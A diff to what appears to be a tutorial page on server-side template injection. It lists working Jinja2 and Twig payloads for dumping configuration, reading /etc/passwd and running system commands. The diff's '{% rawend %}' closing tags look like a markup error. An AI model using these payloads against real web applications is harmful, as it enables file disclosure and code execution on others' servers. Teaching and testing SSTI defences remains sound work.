@@ -54,37 +54,50 @@ ${7*7}
 {% endraw %}
 *Note: There are also SSTI cheat sheets that bundle payloads for popular template engines, such as the [PayloadsAllTheThings SSTI CheatSheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md).
 ## Exploiting SSTI in Jinja2
-{% raw %}
+
 ### Information Disclosure
 Payload to dump the entire web application configuration:
+{% raw %}
 ```
 {{ config.items() }}
 ```
+{% rawend %}
 Payload to dump all available built-in functions:
+{% raw %}
 ```
 {{ self.__init__.__globals__.__builtins__ }}
 ```
+{% rawend %}
 ### Local File Inclusion (LFI)
+{% raw %}
 ```
 {{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
 ```
+{% rawend %}
 ### Remote Code Execution (RCE)
 We can use functions provided by the os library, such as system or popen. However, if the web application has not already imported this library, we must first import it by calling the built-in function import:
+{% raw %}
 ```
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
+{% rawend %}
 ## Exploiting SSTI in Twig
 ### Information Disclosure
 Payload to get information about the current template:
+{% raw %}
 ```
 {{ _self }}
 ```
+{% rawend %}
 ### Local File Inclusion (LFI)
 The PHP web framework Symfony defines additional Twig filters. One of these filters is file_excerpt and can be used to read local files:
+{% raw %}
 ```
 {{ "/etc/passwd"|file_excerpt(1,-1) }}
 ```
+{% rawend %}
 ### Remote Code Execution (RCE)
+{% raw %}
 ```
 {{ ['id'] | filter('system') }}
 ```
